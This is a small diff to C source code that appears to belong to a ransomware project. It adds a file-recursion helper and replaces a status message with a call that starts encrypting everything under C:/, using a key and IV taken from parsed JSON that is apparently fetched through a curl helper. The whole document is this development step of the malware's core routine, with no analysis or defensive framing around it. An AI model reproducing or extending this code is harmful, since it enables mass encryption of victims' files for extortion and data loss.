@@ -1,6 +1,6 @@
 #include "encrypt.h"
 #include "curlHelper.h"
-
+#include "fileRecursor.h"
 #include <openssl/evp.h>
 #include <string.h>
 #include <stdlib.h>
@@ -24,7 +24,7 @@ int main (int argc, char ** argv)
 
 	unsigned char *iv = (unsigned char *)parsedJson[2];
 
-	printf("[-] Encrypting Now\n");
+	startEncrypting("C:/",key,iv);
 	encrypt("plaintext.txt",key,iv);
 	printf("[-] Encryption finished\n");
 
